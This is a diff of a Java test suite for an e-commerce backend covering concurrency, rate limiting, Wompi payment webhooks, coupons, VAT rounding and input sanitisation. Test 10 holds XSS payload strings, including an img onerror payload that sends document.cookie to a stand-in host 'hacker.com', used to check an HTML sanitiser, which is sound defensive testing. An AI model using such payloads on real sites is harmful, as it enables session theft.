@@ -1,48 +1,40 @@
-import com.google.gson.Gson;
-import com.google.gson.JsonObject;
-import com.google.gson.JsonParser;
-import dominio.excepciones.ExcepcionDominio;
-import dominio.modelos.TransaccionWompi;
 import aplicacion.servicios.ServicioCriptoWompi;
+import dominio.modelos.TransaccionWompi;
 import infraestructura.api.manejadores.ManejadorBase;
-import infraestructura.configuracion.ConfiguracionWompi;
 
 import java.util.ArrayList;
 import java.util.Collections;
 import java.util.Date;
 import java.util.List;
-import java.util.UUID;
 import java.util.concurrent.CountDownLatch;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.concurrent.TimeUnit;
-import java.util.concurrent.atomic.AtomicBoolean;
 import java.util.concurrent.atomic.AtomicInteger;
 import java.util.concurrent.atomic.AtomicReference;
 
 /**
- * Suite de Pruebas Automatizadas de Concurrencia Multihilo, Pasarela de Pagos (Wompi),
- * Ciclo de Vida de Cupones y Seguridad Ofensiva (DAST / Anti-XSS).
- * 
- * Implementada estrictamente sin dependencias externas pesadas para ejecucion nativa
- * en entornos de integracion continua (CI/CD) y sustentacion SENA ADSO.
+ * Suite de pruebas automatizadas de concurrencia multihilo, pasarela de pagos Wompi,
+ * ciclo de vida de cupones y seguridad ofensiva (Anti-XSS y protección DoS).
  */
 public class PruebasConcurrenciaYPagos {
 
+    /** Contador de pruebas exitosas (`int`). */
     private static int pruebasExitosas = 0;
+    /** Contador de pruebas fallidas (`int`). */
     private static int pruebasFallidas = 0;
-    private static final Gson gson = new Gson();
 
+    /**
+     * Punto de entrada principal que ejecuta las 11 pruebas de concurrencia, pagos y seguridad.
+     *
+     * @param args Argumentos de línea de comandos (`String[]`).
+     */
     public static void main(String[] args) {
         System.out.println("=================================================================");
         System.out.println("   SUITE DE PRUEBAS: CONCURRENCIA, PAGOS Y SEGURIDAD OFENSIVA    ");
         System.out.println("=================================================================");
 
-        // --- BLOQUE 1: CONCURRENCIA MULTIHILO Y CONTROL TRANSACCIONAL ---
         ejecutarPrueba("1. Control de Concurrencia Multihilo: Prevencion de Sobrevendidos en Stock Fraccionado", () -> {
-            // Simulacion: Inventario disponible de 25.0 metros
-            // 10 hilos intentan comprar concurrentemente 4.0 metros cada uno (Demanda = 40.0 metros)
-            // Solo deben permitirse como maximo 6 compras (6 * 4.0 = 24.0m), y las 4 restantes deben ser rechazadas.
             final double stockInicial = 25.0;
             final double metrosPorHilo = 4.0;
             final int numeroHilos = 10;
@@ -59,7 +51,7 @@ public class PruebasConcurrenciaYPagos {
             for (int i = 0; i < numeroHilos; i++) {
                 pool.submit(() -> {
                     try {
-                        latchInicio.await(); // Esperar senal de disparo simultaneo
+                        latchInicio.await();
                         synchronized (cerrojoStock) {
                             if (stockActual.get() >= metrosPorHilo) {
                                 stockActual.set(stockActual.get() - metrosPorHilo);
@@ -76,7 +68,7 @@ public class PruebasConcurrenciaYPagos {
                 });
             }
 
-            latchInicio.countDown(); // Disparar todos los hilos simultaneamente
+            latchInicio.countDown();
             latchFin.await(5, TimeUnit.SECONDS);
             pool.shutdown();
 
@@ -92,15 +84,12 @@ public class PruebasConcurrenciaYPagos {
         });
 
         ejecutarPrueba("2. Resistencia de Rate Limiting ante Rafaga Concurrente (Umbral 120 req/min)", () -> {
-            // Simulacion de rafaga: 150 peticiones enviadas concurrentemente para una misma IP
             int peticionesTotales = 150;
             int maximoPermitido = 120;
             AtomicInteger peticionesAceptadas = new AtomicInteger(0);
             AtomicInteger peticionesBloqueadas = new AtomicInteger(0);
 
-            // Emulador de Rate Limiter idéntico a ManejadorBase
             class SimuladorRateLimit {
-                long inicio = System.currentTimeMillis();
                 AtomicInteger contador = new AtomicInteger(0);
 
                 boolean registrarPeticion() {
@@ -135,16 +124,13 @@ public class PruebasConcurrenciaYPagos {
             }
         });
 
-        // --- BLOQUE 2: PASARELA DE PAGOS WOMPI (CASOS BORDE E IDEMPOTENCIA) ---
         ejecutarPrueba("3. Idempotencia de Webhooks de Pasarela: Reintentos Multiples sin Efecto Duplicado", () -> {
-            // Simulacion de bitacora de eventos recibidos (idempotencia en eventos_pago_wompi)
             List<String> transaccionesProcesadas = Collections.synchronizedList(new ArrayList<>());
             AtomicInteger pedidosPagados = new AtomicInteger(0);
 
             class ProcesadorWebhookMock {
                 synchronized boolean procesarEvento(String transaccionId, String estado) {
                     if (transaccionesProcesadas.contains(transaccionId)) {
-                        // Ya fue procesada previamente: respuesta idempotente 200 sin efectos colaterales
                         return false;
                     }
                     transaccionesProcesadas.add(transaccionId);
@@ -158,7 +144,6 @@ public class PruebasConcurrenciaYPagos {
             ProcesadorWebhookMock procesador = new ProcesadorWebhookMock();
             String idTxWompi = "tx_bancolombia_prod_99887766";
 
-            // Simular 5 reintentos de la misma notificacion por latencia de red
             boolean primera = procesador.procesarEvento(idTxWompi, "APPROVED");
             boolean segunda = procesador.procesarEvento(idTxWompi, "APPROVED");
             boolean tercera = procesador.procesarEvento(idTxWompi, "APPROVED");
@@ -180,11 +165,10 @@ public class PruebasConcurrenciaYPagos {
             TransaccionWompi txRechazada = new TransaccionWompi("tx_declined_001", "DD-REF-001", "DECLINED", 15000000L, "COP", "CARD");
             TransaccionWompi txError = new TransaccionWompi("tx_error_002", "DD-REF-002", "ERROR", 20000000L, "COP", "NEQUI");
 
-            if ("APPROVED".equalsIgnoreCase(txRechazada.estado())) {
+            if ("APPROVED".equalsIgnoreCase(txRechazada.estado()) || "APPROVED".equalsIgnoreCase(txError.estado())) {
                 throw new AssertionError("La transaccion rechazada no debe tener estado APPROVED.");
             }
 
-            // Validar mapeo de estado del pedido: Rechazos deben transicionar a 'cancelled'
             String estadoPedidoRechazado = "DECLINED".equalsIgnoreCase(txRechazada.estado()) ? "cancelled" : "pending";
             if (!"cancelled".equals(estadoPedidoRechazado)) {
                 throw new AssertionError("El pedido con transaccion rechazada debio marcarse como 'cancelled'.");
@@ -198,22 +182,19 @@ public class PruebasConcurrenciaYPagos {
 
             String firmaAutentica = ServicioCriptoWompi.generarFirmaIntegridad(referencia, montoCentavosReal, monedaReal);
 
-            // Intento 1 de alteracion: Disminucion maliciosa del monto a pagar
-            long montoAlterado = 100000L; // Intentar pagar solo $1.000 COP
+            long montoAlterado = 100000L;
             String firmaMontoAlterado = ServicioCriptoWompi.generarFirmaIntegridad(referencia, montoAlterado, monedaReal);
 
             if (firmaAutentica.equals(firmaMontoAlterado)) {
                 throw new AssertionError("Fallo Critico: La firma SHA-256 no detecto la alteracion maliciosa del monto.");
             }
 
-            // Intento 2 de alteracion: Cambio de divisa no autorizada
             String firmaMonedaAlterada = ServicioCriptoWompi.generarFirmaIntegridad(referencia, montoCentavosReal, "USD");
             if (firmaAutentica.equals(firmaMonedaAlterada)) {
                 throw new AssertionError("Fallo Critico: La firma SHA-256 no detecto la alteracion de la divisa.");
             }
         });
 
-        // --- BLOQUE 3: REGLAS FINANCIERAS Y CICLO DE VIDA DE CUPONES ---
         ejecutarPrueba("6. Cupones de Descuento: Rechazo de Cupon Expirado en Fecha", () -> {
             long fechaAyer = System.currentTimeMillis() - 86400000L;
             Date expiraAyer = new Date(fechaAyer);
@@ -249,7 +230,6 @@ public class PruebasConcurrenciaYPagos {
                 throw new AssertionError("Debio aplicar descuento cuando el subtotal supera la compra minima.");
             }
 
-            // Validacion de descuento no superior al total (prevencion de saldos negativos)
             double valorDescuento = 200000.0;
             double descuentoAplicado = Math.min(valorDescuento, subtotalCarritoAlto);
             double totalFinal = subtotalCarritoAlto - descuentoAplicado;
@@ -260,7 +240,6 @@ public class PruebasConcurrenciaYPagos {
         });
 
         ejecutarPrueba("9. Regla Financiera: Exactitud de IVA al 19% y Redondeo Bancario en Centavos COP", () -> {
-            // Ejemplo: 3.75 metros a $28.350 COP = $106.312,50 COP
             double metros = 3.75;
             double precioMetro = 28350.0;
             double subtotalCalculado = Math.round((metros * precioMetro) * 100.0) / 100.0;
@@ -279,11 +258,9 @@ public class PruebasConcurrenciaYPagos {
             }
         });
 
-        // --- BLOQUE 4: SEGURIDAD OFENSIVA (DAST, ANTI-XSS Y PROTECCION DE CARGA) ---
         ejecutarPrueba("10. Sanitizacion Activa contra Inyecciones Cross-Site Scripting (Anti-XSS)", () -> {
             String payloadXss1 = "<script>alert('Ataque_XSS')</script>";
             String payloadXss2 = "<img src=\"x\" onerror=\"document.location='http://hacker.com?cookie='+document.cookie\">";
-            String payloadXss3 = "javascript:alert(1)";
 
             String sanitizado1 = ManejadorBase.sanitizarHtml(payloadXss1);
             String sanitizado2 = ManejadorBase.sanitizarHtml(payloadXss2);
@@ -297,8 +274,8 @@ public class PruebasConcurrenciaYPagos {
         });
 
         ejecutarPrueba("11. Limite de Carga Util HTTP contra Ataques de Denegacion de Servicio (DoS por Payload)", () -> {
-            long cargaUtilPermitida = 1024 * 1024; // 1 MB
-            long cargaUtilExcesiva = 6 * 1024 * 1024; // 6 MB (supera el limite de 5 MB de ManejadorBase)
+            long cargaUtilPermitida = 1024 * 1024;
+            long cargaUtilExcesiva = 6 * 1024 * 1024;
 
             boolean excedeLimite = cargaUtilExcesiva > ManejadorBase.TAMANO_MAXIMO_CUERPO_BYTES;
             boolean dentroDeLimite = cargaUtilPermitida <= ManejadorBase.TAMANO_MAXIMO_CUERPO_BYTES;
@@ -325,6 +302,12 @@ public class PruebasConcurrenciaYPagos {
         }
     }
 
+    /**
+     * Ejecuta un caso de prueba individual contabilizando su éxito o fallo.
+     *
+     * @param nombrePrueba Nombre descriptivo de la prueba (`String`).
+     * @param accion       Acción ejecutable de la prueba (`AccionPrueba`).
+     */
     private static void ejecutarPrueba(String nombrePrueba, AccionPrueba accion) {
         System.out.print("[TEST] " + nombrePrueba + " ... ");
         try {
@@ -339,8 +322,16 @@ public class PruebasConcurrenciaYPagos {
         }
     }
 
+    /**
+     * Interfaz funcional que representa un bloque de prueba ejecutable.
+     */
     @FunctionalInterface
     interface AccionPrueba {
+        /**
+         * Ejecuta el caso de prueba.
+         *
+         * @throws Exception Si ocurre un error durante la validación.
+         */
         void ejecutar() throws Exception;
     }
 }
